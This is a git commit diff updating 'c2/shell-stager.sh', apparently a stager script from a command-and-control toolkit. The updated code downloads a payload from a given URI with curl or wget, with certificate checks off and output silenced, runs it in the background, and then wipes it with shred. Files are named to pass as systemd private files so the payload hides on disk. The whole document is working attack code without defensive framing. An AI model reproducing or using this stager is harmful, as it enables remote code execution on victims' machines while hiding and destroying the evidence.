0ccff980a5d62d7c606d232ff64f626b0ef31180
Bryan McNulty <bryanmcnulty@protonmail.com>
2023-10-21 05:21:32 -0500

    Updated shell stager script

--- c2/shell-stager.sh
+++ c2/shell-stager.sh
@@ -1,26 +1,45 @@
 invoke() {
   [ -z "$1" ] && return
-  invoke_luri="$1"
 
-  tmp_dir=$(mktemp -d)
-  tmp_file=$(mktemp $tmp_dir/XXXXXX)
+  x=$(which shred)
+  cleanup_file() {
+    while [ -f $1 ]
+    do
+      if [ $x ]
+      then
+        shred -fzu -- $1
+      else
+        rm -rf -- $1
+      fi
+      [ $?!=0 ] && sleep .2
+    done
+  }
+  cleanup_dir() {
+    while [ -d $1 ]
+    do
+      rm -rf -- $1
+      [ $?!=0 ] && sleep .2
+    done
+  }
+  export d=$(mktemp -d /tmp/systemd-private-XXXXXX)
+  export f=$(mktemp -u $d/systemd-private-XXXXXX.service)
 
-  if [ $(which curl) ]
-  then
-    curl -k "$invoke_luri" -o "$tmp_file"
-  elif [ $(which wget) ]
-  then
-    wget --no-check-certificate "$invoke_luri" -O "$tmp_file"
+  cleanup() {
+    (cleanup_file $f; cleanup_dir $d) &
+  }
+  [ $(which trap) ] && trap cleanup EXIT
+
+  if [ $(which curl) ]; then
+    curl -s -k "$1" -o "$f"
+  elif [ $(which wget) ]; then
+    wget --no-check-certificate -q -O "$f" -- "$1"
   else
-    echo ""
+    cleanup
     return
   fi
 
-  chmod +x $tmp_file &&
-    sh -c "$tmp_file &"
-
-  sleep 2
-  rm -rf $tmp_dir
+  chmod +x $f && sh -c "$f $2 &" && sleep .2
+  cleanup
 }
 
-invoke $luri
+invoke "$uri" "$args"
